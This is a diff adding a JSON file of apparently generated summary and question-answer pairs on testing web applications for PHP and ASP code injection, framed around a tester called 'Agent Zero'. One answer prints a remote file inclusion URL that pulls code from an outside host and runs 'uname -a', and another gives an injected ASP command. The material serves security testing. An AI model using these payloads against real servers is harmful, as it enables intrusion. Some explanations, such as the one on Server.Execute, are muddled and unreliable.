@@ -1,0 +1,25 @@
+{
+  "summary": "This document outlines testing methods for code injection vulnerabilities, focusing on web applications that process user input as dynamic code or included files. It explains how testers can use black box and gray box approaches to identify risks in PHP and ASP environments. The key concept is that malicious input can be executed by the server if not properly validated, emphasizing the need for secure coding practices. The document also provides references for further reading on security vulnerabilities and mitigation strategies.",
+  "qa_pairs": [
+    {
+      "question": "How would Agent Zero perform a PHP injection test?",
+      "answer": "Agent Zero would simulate a black box test by crafting malicious URLs that include executable code. It would use the querystring parameter to inject code into a PHP page, which will then execute the injected code as part of an included file. For example, it could send a request like `http://www.example.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a` to test if the server executes the malicious URL."
+    },
+    {
+      "question": "What is the expected result of a PHP injection test?",
+      "answer": "The expected result would be that the web server processes the injected code as part of an included file, leading to execution of the malicious payload. For example, the server might execute `uname -a` or access a specific file if the input is valid."
+    },
+    {
+      "question": "How does Agent Zero handle gray box testing for ASP code injection?",
+      "answer": "Agent Zero would examine ASP code for user input used in execution functions and test if the user can enter commands into the Data input field. It would send a request like `http://www.example.com/asp-page.asp?Data=cmd%20echo%20hello` to test if the server executes the injected command."
+    },
+    {
+      "question": "What is the purpose of Server.Execute in ASP code injection testing?",
+      "answer": "The Server.Execute method in ASP is used to execute a file that has been written with user input. Agent Zero would use this method to test if the server processes and executes malicious data sent via the querystring parameter."
+    },
+    {
+      "question": "How can Agent Zero verify if an input string is safe for execution?",
+      "answer": "Agent Zero would check if the input string contains any executable code or special characters that could be executed by the web server. It would also validate the input against expected formats and prevent it from being processed as dynamic code or included files."
+    }
+  ]
+}
